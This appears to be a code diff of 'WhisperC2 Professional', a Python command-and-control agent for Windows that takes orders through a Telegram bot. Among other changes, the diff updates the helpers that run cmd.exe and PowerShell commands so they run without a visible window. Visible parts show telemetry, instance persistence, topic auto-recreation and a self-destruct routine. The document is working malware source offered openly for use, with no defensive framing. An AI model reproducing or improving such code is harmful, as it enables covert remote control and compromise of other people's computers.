@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Reliable One‑Shot Shell (No Interactive Mode)
+# WhisperC2 Professional – Final Production Build (All Fixes Applied)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -63,6 +63,9 @@ HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
 TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
 PID_FILE = Path(agents_dir) / "agent.pid"
 
+# -----------------------------------------------------------------------------
+# Kill old instance if any
+# -----------------------------------------------------------------------------
 def kill_old_instance():
     if PID_FILE.exists():
         try:
@@ -125,6 +128,9 @@ def send_telemetry(topic_id, status: str) -> bool:
     except:
         return False
 
+# -----------------------------------------------------------------------------
+# Topic management (auto‑recreate if deleted)
+# -----------------------------------------------------------------------------
 def load_topic_id() -> int | None:
     if TOPIC_ID_FILE.exists():
         try:
@@ -205,17 +211,43 @@ def self_destruct(topic_id) -> None:
         pass
 
 # -----------------------------------------------------------------------------
-# Command helpers (no interactive shell)
+# Command helpers (FIXED: subprocess.run with utf‑8 + errors='replace')
 # -----------------------------------------------------------------------------
 def sys_cmd(cmd: str) -> str:
+    """Execute a system command via cmd.exe and return output."""
     try:
-        return subprocess.getstatusoutput(cmd)[1][:4000]
+        proc = subprocess.run(
+            ["cmd.exe", "/c", cmd],
+            capture_output=True,
+            text=True,
+            encoding='utf-8',
+            errors='replace',
+            creationflags=0x08000000,
+            timeout=30
+        )
+        out = (proc.stdout + proc.stderr).strip() or "[No output]"
+        return out[:4000]
+    except subprocess.TimeoutExpired:
+        return "Timed out after 30 seconds"
     except Exception as e:
         return f"Error: {e}"
 
 def ps_cmd(cmd: str) -> str:
+    """Execute a PowerShell command and return output."""
     try:
-        return subprocess.getstatusoutput(f"powershell -Command {cmd}")[1][:4000]
+        proc = subprocess.run(
+            ["powershell", "-Command", cmd],
+            capture_output=True,
+            text=True,
+            encoding='utf-8',
+            errors='replace',
+            creationflags=0x08000000,
+            timeout=30
+        )
+        out = (proc.stdout + proc.stderr).strip() or "[No output]"
+        return out[:4000]
+    except subprocess.TimeoutExpired:
+        return "Timed out after 30 seconds"
     except Exception as e:
         return f"Error: {e}"
 
